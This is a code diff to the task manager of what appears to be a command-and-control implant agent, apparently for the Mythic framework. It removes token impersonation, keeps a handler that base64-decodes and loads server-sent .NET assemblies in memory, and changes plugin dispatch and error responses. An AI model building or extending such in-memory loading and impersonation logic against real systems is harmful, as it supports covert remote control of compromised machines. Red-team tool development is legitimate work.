@@ -21,11 +21,6 @@ namespace Agent.Managers
 
         public async Task StartTaskAsync(ServerJob job)
         {
-            if(job.task.token > 0)
-            {
-                tokenManager.Impersonate(job.task.token);
-            }
-
             this.messageManager.AddJob(job);
             ResponseResult rr = new ResponseResult()
             {
@@ -52,7 +47,6 @@ namespace Agent.Managers
                     break;
                 case "load-assembly":
                     LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
-
                     if (command is not null)
                     {
                         byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
@@ -61,33 +55,25 @@ namespace Agent.Managers
                             this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
                         }
                     }
-
-                    rr.process_response = new Dictionary<string, string> { { "message", "" } };
-                    rr.status = "error";
-                    await this.messageManager.AddResponse(rr);
                     break;
                 default:
                     IPlugin plug;
 
                     if (this.assemblyManager.TryGetPlugin(job.task.command, out plug))
                     {
-                        //Maybe change Execute to take a MythicJob and let Plugins decide whether they support Tokens and stuff.
-
-                        //await plug.Execute(job);
-                        //Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
-                        //parameters.Add("task-id", job.task.id);
                         await plug.Execute(job);
                     }
                     else
                     {
-                        logger.Log("Plugin not found.");
+                        await this.messageManager.AddResponse(new ResponseResult()
+                        {
+                            task_id = job.task.id,
+                            process_response = new Dictionary<string, string> { { "message", "0x11" } },
+                            status = "error",
+                            completed = true,
+                        });
                     }
                     break;
-            }
-
-            if (job.task.token > 0)
-            {
-                tokenManager.Revert();
             }
         }
         public async Task HandleServerResponses(List<ServerResponseResult> responses)
@@ -117,10 +103,7 @@ namespace Agent.Managers
 
             if (this.assemblyManager.TryGetPlugin(type, out plugin))
             {
-                foreach(var response in responses)
-                {
-                    plugin.HandleDatagram(response);
-                }
+                responses.ForEach(response => plugin.HandleDatagram(response));
             }
         }
         public async Task HandleDelegateResponses(List<DelegateMessage> responses)
